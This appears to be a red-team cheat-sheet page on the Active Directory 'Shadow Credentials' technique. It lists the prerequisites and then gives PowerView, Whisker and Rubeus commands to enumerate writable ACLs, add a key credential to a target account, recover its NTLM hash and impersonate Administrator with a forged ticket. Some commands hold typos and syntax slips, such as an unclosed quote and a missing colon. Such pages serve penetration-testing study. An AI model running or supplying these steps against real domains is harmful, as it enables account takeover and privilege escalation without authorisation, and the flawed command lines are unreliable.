# Shadow Credentials

## Theory

User to User (U2U) Service Ticket can be requested to decrypt the encrypted **NTLM\_SUPPLEMENAL\_CREDENTIAL** entity from PAC and extract NTLM hash.

The pre-requisites to abuse it are:

* AD CS or Key Trust
* Support for PKINIT and at least one DC with windows server 2016 or above
* Permissions (GenericAll/GenericWrite) to modify msDS-KeyCredential attribute of the target

## Abuse

{% hint style="info" %}
Admin Access is not required to abuse Shadow Credentials
{% endhint %}

### Enumerate

With PowerView

{% code overflow="wrap" %}
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$.IdentityReferenceName -match "<$Controlled user>
```
{% endcode %}

### Exploit User/ComputerObject Object

Add the Shadow Credential with [wisker](https://github.com/eladshamir/Whisker)

```powershell
./Whisker.exe add /target:<$Object-target>
```

Check with PowerView if Shadow Credential is enabled

{% code overflow="wrap" %}
```powershell
Get-DomainUser -Identity <$Object target>
```
{% endcode %}

Now with the command suggested from Whisker you can obtain the ntlm by adding the option `/getcredentials`

Or get a TGS

{% code overflow="wrap" %}
```powershell
./Rubeus.exe s4u /dc<$DC> /ticket:<$Ticket> /impersonateuser:Administrator /ptt /self /altservice:<$Service>
```
{% endcode %}

